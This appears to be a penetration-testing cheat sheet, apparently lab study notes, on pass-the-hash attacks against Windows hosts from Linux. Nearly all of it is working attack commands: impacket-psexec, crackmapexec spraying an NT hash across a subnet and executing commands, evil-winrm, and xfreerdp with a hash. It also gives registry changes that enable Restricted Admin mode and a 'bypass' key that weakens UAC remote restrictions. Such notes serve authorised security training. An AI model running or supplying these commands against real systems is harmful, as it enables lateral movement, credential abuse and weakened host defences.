# Pass the Hash from Linux
```table-of-contents
```
## Impacket (PsExec/WMIExec)
**Format:** `LM:NT` (If LM is missing, use 32 zeros or just `:NT`).
```shell
# Syntax: impacket-psexec <User>@<IP> -hashes <LM:NT>

# Example
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
### CrackMapExec (CME) / NetExec
```shell
# Test hash against a subnet
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Execute command (-x)
crackmapexec smb 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -x "whoami"
```
**Note on Local Auth:** If you dumped the local SAM database and want to check for password reuse (e.g., checking if the same Local Admin password is used elsewhere), use `--local-auth`.
```shell
crackmapexec smb 172.16.1.0/24 -u Administrator --local-auth -H <Hash>
```
### Evil-WinRM
```shell
# Syntax: evil-winrm -i <IP> -u <User> -H <Hash>
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
### RDP (xFreeRDP)
**Enabling Restricted Admin Mode (Target Registry):** If you have command execution, you can enable it:
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
**Connecting via RDP:**
```shell
# /pth: <NTHash>
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /cert:ignore
```
## Limitations & UAC (LocalAccountTokenFilterPolicy)
### The Rule
- **Domain Users:** PtH works normally if they have admin rights.
- **Local RID 500 (Built-in Administrator):** PtH works normally.
- **Local Non-RID 500 Admins (Created Users):** PtH will **FAIL** remotely unless a specific registry key is set.
### The Bypass Key
```powershell
# Registry Key required for Local User PtH
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1
```